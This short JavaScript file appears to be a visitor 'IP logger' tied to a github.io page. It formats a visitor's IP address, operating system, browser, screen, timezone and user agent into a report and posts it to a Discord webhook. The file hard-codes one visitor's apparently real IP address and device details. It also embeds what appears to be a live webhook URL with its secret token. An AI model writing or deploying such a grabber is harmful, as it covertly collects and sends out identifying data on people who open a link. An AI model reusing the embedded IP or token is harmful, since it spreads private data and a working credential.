// Discord Webhook URL
const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1514007577355092080/UT9EM1Y7BApmmULLk_Z9gn1Rbw7Le42Xq1xDUYGceFKl39imPfYXI0Nrte1mihIKebxd';

// Visitor Information
const visitorInfo = {
  ipAddress: '31.187.78.186',
  os: 'Windows',
  browser: 'Chrome',
  deviceType: 'Desktop',
  screenResolution: '2560x1440',
  colorDepth: '32-bit',
  language: 'en-US',
  timezone: 'Asia/Riyadh',
  timestamp: '6/10/2026, 12:05:24 AM',
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0',
  pageURL: 'https://darkstmen-stack.github.io/dd/'
};

// Create Discord embed
const embed = {
  title: '📊 Visitor Information Report',
  color: 0x2f3136,
  fields: [
    { name: '🌐 IP Address', value: visitorInfo.ipAddress, inline: true },
    { name: '💻 OS', value: visitorInfo.os, inline: true },
    { name: '🌐 Browser', value: visitorInfo.browser, inline: true },
    { name: '📱 Device Type', value: visitorInfo.deviceType, inline: true },
    { name: '🖥️ Screen Resolution', value: visitorInfo.screenResolution, inline: true },
    { name: '🎨 Color Depth', value: visitorInfo.colorDepth, inline: true },
    { name: '🌍 Language', value: visitorInfo.language, inline: true },
    { name: '⏰ Timezone', value: visitorInfo.timezone, inline: true },
    { name: '📅 Timestamp', value: visitorInfo.timestamp, inline: true },
    { name: '🔗 Page URL', value: visitorInfo.pageURL, inline: false },
    { name: '📝 User Agent', value: `\`\`\`${visitorInfo.userAgent}\`\`\``, inline: false }
  ],
  timestamp: new Date().toISOString()
};

// Send to Discord
async function sendToDiscord() {
  try {
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        embeds: [embed]
      })
    });

    if (response.ok) {
      console.log('✅ Visitor information sent to Discord successfully!');
    } else {
      console.error('❌ Failed to send to Discord:', response.statusText);
    }
  } catch (error) {
    console.error('❌ Error sending to Discord:', error);
  }
}

// Run if this is in Node.js environment
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { sendToDiscord, visitorInfo };
  sendToDiscord();
}

// Run if in browser environment
if (typeof window !== 'undefined') {
  window.sendVisitorInfo = sendToDiscord;
}